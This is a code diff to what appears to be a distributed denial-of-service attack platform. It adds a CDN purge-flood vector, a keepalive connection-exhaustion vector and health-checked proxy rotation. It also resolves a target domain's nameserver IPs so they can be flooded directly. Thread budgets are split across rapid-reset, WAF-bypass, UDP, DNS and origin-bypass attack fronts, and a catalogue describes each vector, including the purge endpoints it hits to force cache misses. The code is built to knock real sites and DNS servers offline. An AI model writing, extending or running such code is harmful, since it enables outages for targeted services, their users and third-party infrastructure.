@@ -26,7 +26,7 @@ import {
   DeleteAttackParams,
   StopAttackParams,
 } from "@workspace/api-zod";
-import { proxyCache } from "./proxies.js";
+import { proxyCache, healthyProxyCache } from "./proxies.js";
 import { CLUSTER_NODES } from "./cluster.js";
 
 // ── Cluster node health cache — refreshed every 60 s ─────────────────────────
@@ -438,6 +438,8 @@ const HTTP_PROXY_METHODS = new Set([
   "geass-ultima", "geass-absolutum",
   // CDN bypass — needs proxy rotation for both origin and CDN attacks
   "origin-bypass",
+  // CDN cache invalidation — purge requests via proxy to force origin hit on every req
+  "cdn-purge-flood",
 ]);
 
 // ── Cloudflare IP range check (for origin-bypass auto-discovery) ──────────
@@ -572,10 +574,16 @@ function spawnPool(
   const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
   const workers: Worker[] = [];
   const workerConns = new Array<number>(numWorkers).fill(0);
-  // Pass ALL fastest proxies (HTTP + SOCKS5) to workers for maximum IP rotation
-  const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
-    ? proxyCache.map(p => ({ host: p.host, port: p.port, type: p.type as "http" | "socks5" | undefined, username: p.username, password: p.password }))
+  // Prefer health-checked proxies (TCP-verified live); fall back to full cache
+  // healthyProxyCache is populated 20s after startup by background health-check
+  const _proxySource = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
+    ? (healthyProxyCache.length >= 50 ? healthyProxyCache : proxyCache)
     : [];
+  const proxies = _proxySource.map(p => ({
+    host: p.host, port: p.port,
+    type: p.type as "http" | "socks5" | undefined,
+    username: p.username, password: p.password,
+  }));
 
   return new Promise<void>((resolve) => {
     const finished = new Set<number>();
@@ -1092,12 +1100,14 @@ async function runAttackWorkers(
     }
 
     // Thread allocation across fronts
-    // Deploy: subdomain spray eats 10% of budget; origin 20%; DNS 3%; rest to CDN
-    // Dev:    no spray; origin 25% if found; DNS 4%; rest to CDN
+    // Deploy: spray 10%; origin 20%; DNS 3%; keepalive 5%; purge 4%; rest → CDN
+    // Dev:    no spray; origin 25% if found; DNS 4%; keepalive 4%; purge 3%
     const dnsT_ab    = Math.max(50,  Math.round(threads * (IS_DEPLOYED ? 0.03 : 0.04)));
     const sprayT_ab  = IS_DEPLOYED && sprayTargets.length > 0 ? Math.round(threads * 0.10) : 0;
     const originT_ab = originIP_ab ? Math.max(200, Math.round(threads * (IS_DEPLOYED ? 0.20 : 0.25))) : 0;
-    const cdnT_ab    = threads - dnsT_ab - sprayT_ab - originT_ab;
+    const kaT_ab     = Math.max(80,  Math.round(threads * (IS_DEPLOYED ? 0.05 : 0.04)));
+    const purgeT_ab  = Math.max(50,  Math.round(threads * (IS_DEPLOYED ? 0.04 : 0.03)));
+    const cdnT_ab    = threads - dnsT_ab - sprayT_ab - originT_ab - kaT_ab - purgeT_ab;
 
     const rrT_ab   = Math.max(600,  Math.round(cdnT_ab * 0.55));
     const wafT_ab  = Math.max(500,  Math.round(cdnT_ab * 0.45));
@@ -1110,8 +1120,25 @@ async function runAttackWorkers(
     const udpT_ab  = Math.max(100,  Math.round(cdnT_ab * 0.08));
     const h3T_ab   = Math.max(100,  Math.round(cdnT_ab * 0.08));
 
+    // In deploy mode: also resolve NS server IPs and attack them directly
+    // This is more efficient than dns-ns-flood on the domain (avoids extra NS resolution round-trip)
+    const nsDirectPools: Promise<void>[] = [];
+    if (IS_DEPLOYED) {
+      try {
+        const nsNames = await dnsP.resolveNs(baseDomain).catch(() => [] as string[]);
+        const nsIpLists = await Promise.allSettled(nsNames.slice(0, 4).map(ns => dnsP.resolve4(ns).catch(() => [] as string[])));
+        const nsIPs: string[] = [];
+        for (const r of nsIpLists) if (r.status === "fulfilled") nsIPs.push(...r.value);
+        const nsT = Math.max(200, Math.round(dnsT_ab / Math.max(nsIPs.length, 1)));
+        for (const ip of nsIPs.slice(0, 6)) {
+          nsDirectPools.push(spawnPool("dns-ns-flood", ip, 53, nsT, Math.max(2, CPU_COUNT), signal, onStats));
+        }
+        if (nsIPs.length > 0) console.log(`[geass-absolutum] NS direct attack: ${nsIPs.join(", ")} (${nsIPs.length} IPs)`);
+      } catch { /* NS resolution failed — fallback to domain-level dns-ns-flood */ }
+    }
+
     const allFronts: Promise<void>[] = [
-      // ── Front A: CDN/Host — all 11 geass-ultima vectors + scaled workers ──
+      // ── Front A: CDN/Host — 13 vectors + scaled workers ────────────────────
       spawnPool("rapid-reset",         target, port, rrT_ab,   W(4),  signal, onStats),
       spawnPool("waf-bypass",          target, port, wafT_ab,  W(3),  signal, onStats),
       spawnPool("h2-storm",            target, port, h2T_ab,   W(4),  signal, onStats),
@@ -1122,8 +1149,14 @@ async function runAttackWorkers(
       spawnPool("sse-exhaust",         target, port, sseT_ab,  IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
       spawnPool("udp-flood",           target, port, udpT_ab,  IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
       spawnPool("h3-rapid-reset",      target, port, h3T_ab,   W(4),  signal, onStats),
-      // ── Front C: DNS NS — destroi resolução DNS do domínio inteiro ─────────
+      // ── Keepalive exhaust — drains CDN connection pool via proxies ─────────
+      spawnPool("keepalive-exhaust",   target, port, kaT_ab,   IS_DEPLOYED ? Math.max(6, CPU_COUNT) : 1, signal, onStats),
+      // ── CDN purge flood — forces cache miss on every request ───────────────
+      spawnPool("cdn-purge-flood",     target, port, purgeT_ab, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
+      // ── Front C: DNS NS — via domain (fallback / always) ──────────────────
       spawnPool("dns-ns-flood",        target, port, dnsT_ab,  IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
+      // ── NS direct IPs (deploy only) ────────────────────────────────────────
+      ...nsDirectPools,
     ];
 
     // ── Front B: Direct origin IP (bypasses CDN completely) ──────────────────
@@ -1263,6 +1296,7 @@ const METHODS_CATALOGUE = [
   // ── New vectors ───────────────────────────────────────────────────────────
   { id: "tls-session-exhaust",  name: "TLS Session Cache Exhaustion",          layer: "L4",   protocol: "TLS",                  tier: "A",      description: "Full TLS handshake per conn — no resumption — saturates server's RSA/ECDHE crypto thread pool. 5× more CPU-intensive than conn-flood" },
   { id: "cache-buster",         name: "Cache Busting — 100% Origin Hit Rate",  layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Unique cache keys + Cache-Control:no-cache + Vary bombs — forces CDN to miss 100% of requests, overwhelming the origin directly" },
+  { id: "cdn-purge-flood",     name: "CDN Purge Flood — Cache Invalidation",  layer: "L7",   protocol: "HTTP/HTTPS",           tier: "S",      description: "Floods CDN purge endpoints (GoCache /cdn-cgi/purge, /cdn-cgi/cache-purge, PURGE/BAN methods) via proxies — forces cache miss on every subsequent request, routing all traffic to origin. GoCache-specific + generic." },
   // Previously missing from catalogue
   { id: "udp-bypass",           name: "UDP Bypass",                            layer: "L4",   protocol: "UDP",                  tier: "B",      description: "UDP flood with bypass techniques to evade basic rate limiting and DDoS mitigation" },
   { id: "tcp-ack",              name: "TCP ACK Flood",                         layer: "L4",   protocol: "TCP",                  tier: "B",      description: "Sends ACK packets without established connections, forcing the target to process each one" },
